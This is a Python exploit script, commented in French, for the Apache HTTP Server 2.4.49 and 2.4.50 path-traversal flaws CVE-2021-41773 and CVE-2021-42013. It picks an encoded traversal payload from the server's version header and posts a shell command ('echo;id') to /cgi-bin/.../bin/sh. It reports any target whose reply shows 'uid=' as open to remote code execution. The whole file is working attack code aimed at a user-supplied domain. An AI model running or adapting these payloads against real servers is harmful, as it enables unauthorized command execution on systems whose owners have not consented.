#!/usr/bin/python
import sys
import requests
import argparse
import urllib

# User-Agent
user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0"

# Instructions d'utilisation
usage = "\n- cve-2021-42013.py -u domaine.com"
description = "cve-2021-42013.py est un script python pour éxploiter la vulnérabilité d'exécution de code à distance dans Apache 2.4.49 et 2.4.50"

# Analyseur d'arguments
parser = argparse.ArgumentParser(usage=usage, description=description)
parser.add_argument("-u", dest="url", type=str, help="Spécifiez un domaine/ip à scanner pour CVE-2021-42013.")
args = parser.parse_args()

# Vérifiez le format d'URL valide et la connection
def urlCheck(url):
    try:
        resp = requests.head(url, headers={"User-Agent": user_agent})
        return resp
    except (requests.exceptions.RequestException, requests.exceptions.InvalidURL) as e:
        print("\n[-] Une erreur s'est produite lors de la connexion à l'URL :", e)
        sys.exit()

def exploitRCE(url, payload, cve_id):
    payload = url + urllib.parse.quote(payload, safe="/%")
    data = "echo;id"
    data = data.encode("ascii")
    print("[+] Exécution du payload " + payload)
    try:
        request = urllib.request.Request(payload, data=data, headers={"User-Agent": user_agent})
        response = urllib.request.urlopen(request)
        res = response.read().decode("utf-8")
        if "uid=" in res:
            print("[!] " + url + " est vulnérable à une attaque d'exécution de code à distance (" + cve_id + ")")
            print("[+] Réponse:")
            print(res)
        else:
            print("[!] " + url + " n'est pas vulnérable à " + cve_id + "\n")
    except urllib.error.HTTPError:
        print("[!] " + url + " n'est pas vulnérable à " + cve_id + "\n")

def RCE(url):
    resp = urlCheck(url)
    version = resp.headers.get('server', '')
    if "49" in version:
        cve_id = "CVE-2021-41773"
        payload = "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"
        exploitRCE(url, payload, cve_id)
    elif "50" in version:
        cve_id = "CVE-2021-42013"
        payload = "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh"
        exploitRCE(url, payload, cve_id)
    else:
        cve_id = "CVE-2021-41773"
        payload = "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"
        exploitRCE(url, payload, cve_id)
        if not "49" in version and not "50" in version:
            cve_id = "CVE-2021-42013"
            payload = "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh"
            exploitRCE(url, payload, cve_id)

if args.url:
    url = args.url
    RCE(url)
else:
    print("[-] Aucun paramètre donné. Veuillez consulter l'aide avec '-h'\n")
    sys.exit()
